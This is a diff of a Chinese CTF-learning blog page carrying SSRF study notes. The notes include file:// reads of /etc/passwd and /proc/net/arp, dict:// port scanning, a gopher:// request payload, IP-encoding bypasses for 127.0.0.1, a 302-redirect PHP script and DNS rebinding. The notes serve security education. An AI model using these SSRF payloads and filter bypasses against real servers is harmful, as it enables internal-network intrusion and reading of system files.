@@ -6,19 +6,22 @@
   <meta name="keywords" content=" 学习笔记 , ssrf ">
   <meta name="description" content="ssrf | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="SSRFSSRF漏洞原理">
+<meta name="description" content="BUUCTF2018-OnlineTool1首先启动靶机并访问，看到一串源码 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] &#x3D; $_SERVER[&#x27;HTTP_X_FOR">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ssrf">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/03/16/ssrf/index.html">
+<meta property="og:title" content="BUUCTF2018-OnlineTool1">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/03/21/BUUCTF2018-OnlineTool1/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="SSRFSSRF漏洞原理">
+<meta property="og:description" content="BUUCTF2018-OnlineTool1首先启动靶机并访问，看到一串源码 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] &#x3D; $_SERVER[&#x27;HTTP_X_FOR">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-03-16T13:44:06.000Z">
-<meta property="article:modified_time" content="2025-03-16T13:46:48.987Z">
+<meta property="og:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
+<meta property="article:published_time" content="2025-03-21T11:50:32.000Z">
+<meta property="article:modified_time" content="2025-03-21T12:11:22.526Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="学习笔记">
-<meta property="article:tag" content="ssrf">
+<meta property="article:tag" content="刷题笔记">
+<meta property="article:tag" content="escapeshellarg()和escapeshellcmd()、单引号逃逸">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -117,7 +120,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(37)</small>
+                <small>(44)</small>
             
         </div>
     </li>
@@ -152,8 +155,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="37">
-<input type="hidden" id="yelog_site_word_count" value="105.1k">
+<input type="hidden" id="yelog_site_posts_number" value="44">
+<input type="hidden" id="yelog_site_word_count" value="119.9k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -243,6 +246,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>escapeshellarg()和escapeshellcmd()、单引号逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>filter伪协议</a>
             </li>
         
@@ -256,6 +263,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux find -name模糊查询文件</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -306,6 +317,10 @@
                 <i class="iconfont icon-tag"></i><a>xss漏洞</a>
             </li>
         
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xxe</a>
+            </li>
+        
     </div>
 
 </div>
@@ -316,6 +331,69 @@
     </div>
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/03/21/BUUCTF2018-OnlineTool1/"
+           data-tag="刷题笔记,escapeshellarg()和escapeshellcmd()、单引号逃逸"
+           data-author="" >
+            <span class="post-title" title="BUUCTF2018-OnlineTool1">BUUCTF2018-OnlineTool1</span>
+            <span class="post-date" title="2025-03-21 19:50:32">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/21/BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"
+           data-tag="刷题笔记,php特性"
+           data-author="" >
+            <span class="post-title" title="BJDCTF2020-ZJCTF不过如此">BJDCTF2020-ZJCTF不过如此</span>
+            <span class="post-date" title="2025-03-21 19:04:56">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1/"
+           data-tag="刷题笔记,命令执行,php反序列化,linux find -name模糊查询文件"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020朱雀组phpweb1">网鼎杯2020朱雀组phpweb1</span>
+            <span class="post-date" title="2025-03-20 23:56:35">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/BSidesCF2020Hadabadday1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="BSidesCF2020Hadabadday1">BSidesCF2020Hadabadday1</span>
+            <span class="post-date" title="2025-03-20 23:55:26">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"
+           data-tag="刷题笔记,sql注入,php反序列化,ssrf"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2018Fakebook1">网鼎杯2018Fakebook1</span>
+            <span class="post-date" title="2025-03-20 23:53:35">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/19/ctfshow-ssrf/"
+           data-tag="学习笔记,ssrf"
+           data-author="" >
+            <span class="post-title" title="ctfshow-ssrf">ctfshow-ssrf</span>
+            <span class="post-date" title="2025-03-19 20:05:14">2025/03/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/19/ctfshow-xxe/"
+           data-tag="学习笔记,xxe"
+           data-author="" >
+            <span class="post-title" title="ctfshow-xxe">ctfshow-xxe</span>
+            <span class="post-date" title="2025-03-19 13:32:30">2025/03/19</span>
+        </a>
         
         
         <a  class="All "
@@ -392,7 +470,7 @@
         
         <a  class="All "
            href="/2025/03/08/ctfshow-sqli-labs/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
             <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
@@ -401,7 +479,7 @@
         
         <a  class="All "
            href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-sql注入">ctfshow-sql注入</span>
             <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
@@ -410,7 +488,7 @@
         
         <a  class="All "
            href="/2025/03/02/php%E7%89%B9%E6%80%A7/"
-           data-tag="学习笔记,php特性"
+           data-tag="php特性,学习笔记"
            data-author="" >
             <span class="post-title" title="php特性">php特性</span>
             <span class="post-date" title="2025-03-02 20:14:41">2025/03/02</span>
@@ -419,7 +497,7 @@
         
         <a  class="All "
            href="/2025/02/24/ctfshow-php%E7%89%B9%E6%80%A7/"
-           data-tag="学习笔记,php特性"
+           data-tag="php特性,学习笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-php特性">ctfshow-php特性</span>
             <span class="post-date" title="2025-02-24 18:53:16">2025/02/24</span>
@@ -509,7 +587,7 @@
         
         <a  class="All "
            href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
-           data-tag="学习笔记,文件包含"
+           data-tag="文件包含,学习笔记"
            data-author="" >
             <span class="post-title" title="文件包含漏洞总结">文件包含漏洞总结</span>
             <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
@@ -599,7 +677,7 @@
         
         <a  class="All "
            href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="sql注入">sql注入</span>
             <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
@@ -689,12 +767,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-03-16 21:46:48'>2025-03-16 21:44</time>
+            Created At : <time class="date" title='Updated At: 2025-03-19 20:49:54'>2025-03-16 21:44</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:5</span>
+        <span>Count:1.8k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -724,7 +802,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">SSRF漏洞原理</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">SSRF漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">ssrf是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E5%BD%A2%E6%88%90%E7%9A%84%E5%8E%9F%E5%9B%A0%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-text">ssrf形成的原因以及攻击方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">ssrf漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#File%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E6%9F%A5%E6%89%BE%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BAIP%EF%BC%89"><span class="toc-text">File伪协议（查找内网存活主机IP）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dict%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88-%E6%9F%A5%E6%89%BE%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%EF%BC%89"><span class="toc-text">dict伪协议（ 查找内网主机开放端口）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%89"><span class="toc-text">HTTP伪协议（目录扫描）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gopher%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89"><span class="toc-text">gopher伪协议（重点）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E4%BC%AA%E5%8D%8F%E8%AE%AEGET%E6%8F%90%E4%BA%A4%E4%BB%A5%E5%8F%8APOST%E6%8F%90%E4%BA%A4"><span class="toc-text">gopher伪协议GET提交以及POST提交</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher%E4%BC%AA%E5%8D%8F%E8%AE%AEGET%E6%8F%90%E4%BA%A4"><span class="toc-text">gopher伪协议GET提交</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher%E4%BC%AA%E5%8D%8F%E8%AE%AEPOST%E6%8F%90%E4%BA%A4"><span class="toc-text">gopher伪协议POST提交</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E4%B9%8B%E7%8E%AF%E5%9B%9E%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87"><span class="toc-text">SSRF之环回地址绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E4%B9%8B302%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87"><span class="toc-text">SSRF之302重定向绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#302%E9%87%8D%E5%AE%9A%E5%90%91%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-text">302重定向原理：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E4%B9%8BDNS%E9%87%8D%E7%BB%91%E5%AE%9A%E7%BB%95%E8%BF%87"><span class="toc-text">SSRF之DNS重绑定绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-text">DNS重绑定攻击原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SSRF-GET%E6%8F%90%E4%BA%A4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">使用SSRF GET提交命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SSRF-POST%E6%8F%90%E4%BA%A4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">使用SSRF POST提交命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SSRF%E8%BF%9B%E8%A1%8CXXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">使用SSRF进行XXE漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SSRF%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">使用SSRF进行sql注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5GET%E6%8F%90%E4%BA%A4"><span class="toc-text">sql注入GET提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5POST%E6%8F%90%E4%BA%A4"><span class="toc-text">sql注入POST提交</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SSRF%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">使用SSRF进行文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#multipart-form-data%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-text">multipart&#x2F;form-data的定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0gohper%E6%8F%90%E4%BA%A4%E6%95%B0%E6%8D%AE"><span class="toc-text">构造gohper提交数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8gopher%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%8F%90%E4%BA%A4"><span class="toc-text">使用gopher伪协议提交</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SSRF%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">使用SSRF进行文件包含漏洞利用</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -740,7 +818,170 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2>
+        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><h3 id="ssrf是什么"><a href="#ssrf是什么" class="headerlink" title="ssrf是什么"></a>ssrf是什么</h3><p><img src="/../image/ssrf-1.png"></p>
+<h3 id="ssrf形成的原因以及攻击方式"><a href="#ssrf形成的原因以及攻击方式" class="headerlink" title="ssrf形成的原因以及攻击方式"></a>ssrf形成的原因以及攻击方式</h3><p><img src="/../image/ssrf-2.png"></p>
+<p><img src="/../image/ssrf-3.png"></p>
+<h3 id="ssrf漏洞利用"><a href="#ssrf漏洞利用" class="headerlink" title="ssrf漏洞利用"></a>ssrf漏洞利用</h3><p><img src="/../image/ssrf-4.png"></p>
+<hr>
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">file:</span><span class="hljs-comment">//	从文件系统中获取文件内容，如file://etc/passwd</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//	字典服务协议，访问字典资源，如dict:///ip:6739/info:</span><br><span class="hljs-symbol">ftp:</span><span class="hljs-comment">//	可用于网络端口扫描</span><br><span class="hljs-symbol">sftp:</span><span class="hljs-comment">//	SSH文件传输协议或安全文件传输协议</span><br><span class="hljs-symbol">ldap:</span><span class="hljs-comment">//	轻量级目录访问协议</span><br><span class="hljs-symbol">tftp:</span><span class="hljs-comment">//	简单文件传输协议</span><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//	分布式文档传递服务</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="File伪协议（查找内网存活主机IP）"><a href="#File伪协议（查找内网存活主机IP）" class="headerlink" title="File伪协议（查找内网存活主机IP）"></a>File伪协议（查找内网存活主机IP）</h2><p><strong>file:&#x2F;&#x2F; 从文件系统中获取文件内容，格式为 file:&#x2F;&#x2F;[文件路径]</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd	读取文件passwd<br><br>file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>hosts	显示当前操作系统网卡的IP<br><br>file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>net/arp	显示arp缓存表（寻找内网其他主机）<br><br>file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>net/fib_trie	显示当前网段路由信息<br></code></pre></td></tr></table></figure>
+
+<p><strong>file:&#x2F;&#x2F;proc&#x2F;net&#x2F;arp配合bp的intruder模块寻找内网其他主机</strong></p>
+<p><img src="/../image/ssrf-5.png"></p>
+<hr>
+<h2 id="dict伪协议（-查找内网主机开放端口）"><a href="#dict伪协议（-查找内网主机开放端口）" class="headerlink" title="dict伪协议（ 查找内网主机开放端口）"></a>dict伪协议（ 查找内网主机开放端口）</h2><p>也可以使用ftp:&#x2F;&#x2F;但是效率较低</p>
+<p>dict:&#x2F;&#x2F;字典服务协议，访问字典资源，如dict:&#x2F;&#x2F;ip:6739&#x2F;info:</p>
+<p>可用于：扫描端口、获取内网信息、爆破密码等</p>
+<p><strong>ftp伪协议配合bp的intruder模块查找内网主机开放端口</strong></p>
+<p><img src="/../image/ssrf-6.png"></p>
+<p><strong>dict伪协议配合bp集束炸弹攻击查找内网主机开放端口</strong></p>
+<p><img src="/../image/ssrf-7.png"></p>
+<p><strong>dict伪协议获取网站信息</strong></p>
+<p><img src="/../image/ssrf-8.png"></p>
+<hr>
+<h2 id="HTTP伪协议（目录扫描）"><a href="#HTTP伪协议（目录扫描）" class="headerlink" title="HTTP伪协议（目录扫描）"></a>HTTP伪协议（目录扫描）</h2><p><strong>http伪协议</strong></p>
+<p><img src="/../image/ssrf-9.png"></p>
+<p><strong>http伪协议配合bp目录扫描获取网站子页面</strong></p>
+<p><img src="/../image/ssrf-10.png"></p>
+<hr>
+<h2 id="gopher伪协议（重点）"><a href="#gopher伪协议（重点）" class="headerlink" title="gopher伪协议（重点）"></a>gopher伪协议（重点）</h2><p><strong>gopher伪协议</strong></p>
+<p>利用范围较广：GET提交、POST提交、redis、Fastcgi、sql</p>
+<p><strong>基本格式：</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">URL</span><span class="hljs-symbol">:gopher</span><span class="hljs-symbol">://&lt;host&gt;</span><span class="hljs-symbol">:&lt;port&gt;/&lt;gopher-path&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>web也需要加端口号80</p>
+<p>gopher协议默认端口为70</p>
+<hr>
+<p><strong>gopher请求不转发第一个字符：</strong></p>
+<p>所以需要使用下划线填充首位</p>
+<p><img src="/../image/ssrf-11.png"></p>
+<h3 id="gopher伪协议GET提交以及POST提交"><a href="#gopher伪协议GET提交以及POST提交" class="headerlink" title="gopher伪协议GET提交以及POST提交"></a>gopher伪协议GET提交以及POST提交</h3><p><strong>GET提交：直接提交就能执行</strong></p>
+<p><img src="/../image/ssrf-12.png"></p>
+<p><strong>POST提交：要使用gopher伪协议</strong></p>
+<p><img src="/../image/ssrf-13.png"></p>
+<h4 id="gopher伪协议GET提交"><a href="#gopher伪协议GET提交" class="headerlink" title="gopher伪协议GET提交"></a>gopher伪协议GET提交</h4><p><strong>需要保留两个头部信息，而且在GET提交头部信息之后必须要加一个换行符</strong></p>
+<p>浏览器提交</p>
+<p><img src="/../image/ssrf-14.png"></p>
+<p>bp请求包提交</p>
+<p><img src="/../image/ssrf-15.png"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://<span class="hljs-number">172.250.250.4:80</span>/_GET%<span class="hljs-number">20</span>/name.php%<span class="hljs-number">3</span>fname=benben%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>AHOST:%<span class="hljs-number">20172</span>.<span class="hljs-number">250</span>.<span class="hljs-number">250</span>.<span class="hljs-number">4</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong></p>
+<p><strong>如果要成功提交，需要进行两次url编码，因为ssrf主机会帮我们解码一次，然后再目标内网主机又会解码一次。所以如果要在bp添加gopher伪协议，需要进行两次url编码</strong></p>
+<p><strong>如果在浏览器上的话只需要一次，因为浏览器会帮我们编码一次，我们自己编码一次。</strong></p>
+<h4 id="gopher伪协议POST提交"><a href="#gopher伪协议POST提交" class="headerlink" title="gopher伪协议POST提交"></a>gopher伪协议POST提交</h4><p><strong>需要保留四个头部信息，且长度需要与实际长度对应</strong></p>
+<p><img src="/../image/ssrf-16.png"></p>
+<p><strong>在bp重放器里先进行两次url编码，然后再放到gopher伪协议后面然后提交</strong></p>
+<p><img src="/../image/ssrf-17.png"></p>
+<p><img src="/../image/ssrf-18.png"></p>
+<p><strong>使用插件HackBar进行POST提交</strong></p>
+<p><img src="/../image/ssrf-19.png"></p>
+<p>建议先写好gopher伪协议的固定格式然后抓包，再进行构造头部信息以及编码</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.4:80/_</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SSRF之环回地址绕过"><a href="#SSRF之环回地址绕过" class="headerlink" title="SSRF之环回地址绕过"></a>SSRF之环回地址绕过</h2><p>比赛中经常限制访问本地网站的某些内容</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_SEVER[<span class="hljs-string">&#x27;REMOTE_ADD&#x27;</span>]==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>看到REMOTE_ADD地址是127.0.0.1时才会显示</p>
+<p>而’127.0.0.1’会被限制</p>
+<p>可将’127.0.0.1’变形显示</p>
+<hr>
+<p><strong>ip地址</strong></p>
+<p><img src="/../image/ssrf-20.png"></p>
+<p>将127.0.0.1替换为其他进制的表达方式来绕过过滤</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>八进制	<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">017700000001</span><span class="hljs-regexp">/flag.php	点分式	http:/</span><span class="hljs-regexp">/0177.0000.0000.0001/</span>flag.php<br><br>十六进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F000001<span class="hljs-regexp">/flag.php		http:/</span><span class="hljs-regexp">/0x7F.0x00.0x00.0x01/</span>flag.php		http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>/flag.php<br><br>十进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SSRF之302重定向绕过"><a href="#SSRF之302重定向绕过" class="headerlink" title="SSRF之302重定向绕过"></a>SSRF之302重定向绕过</h2><p>302重定向主要是绕过针对私网地址被限制的情况</p>
+<h3 id="302重定向原理："><a href="#302重定向原理：" class="headerlink" title="302重定向原理："></a>302重定向原理：</h3><p><img src="/../image/ssrf-21.png"></p>
+<p>具体实现：</p>
+<p><img src="/../image/ssrf-22.png"></p>
+<p>我们需要有一台有公网IP的服务器，然后进行域名解析的WEB服务，然后构建302重定向代码，</p>
+<p>具体步骤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">在有公网的服务器linux系统下<br><span class="hljs-comment">#index.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);<br><br>开启web服务<br>php -S <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">7777</span><br><br><br>ssrf服务器访问<br>http:<span class="hljs-comment">//公网ip:7777/index.php</span><br><br>成功执行<span class="hljs-number">302</span>重定向<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SSRF之DNS重绑定绕过"><a href="#SSRF之DNS重绑定绕过" class="headerlink" title="SSRF之DNS重绑定绕过"></a>SSRF之DNS重绑定绕过</h2><p><strong>针对SSRF漏洞的防御</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 解析目标URL，获取其Host<br><span class="hljs-bullet">2.</span> 解析Host，获取Host指向的IP地址<br><span class="hljs-bullet">3.</span> 检查IP地址是否为内网地址<br><span class="hljs-bullet">4.</span> 请求URL<br><span class="hljs-bullet">5.</span> 如果有跳转，拿出跳转URL，执行1<br></code></pre></td></tr></table></figure>
+
+<p>可以有效限制：直接访问内网IP；302跳转；xip.io&#x2F;xip.name 及短链接变换等URL变形；</p>
+<p>畸形URL；iframe攻击；IP进制变换</p>
+<p><strong>针对这种防御可以使用DNS Rebinding Attack（DNS重绑定攻击）</strong></p>
+<hr>
+<h3 id="DNS重绑定攻击原理"><a href="#DNS重绑定攻击原理" class="headerlink" title="DNS重绑定攻击原理"></a><strong>DNS重绑定攻击原理</strong></h3><p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">DNS重绑定网站TTL值为0</a></p>
+<p>设置A为公网IP，B为私网IP</p>
+<p><img src="/../image/ssrf-23.png"></p>
+<p><img src="/../image/ssrf-24.png"></p>
+<p><img src="/../image/ssrf-25.png"></p>
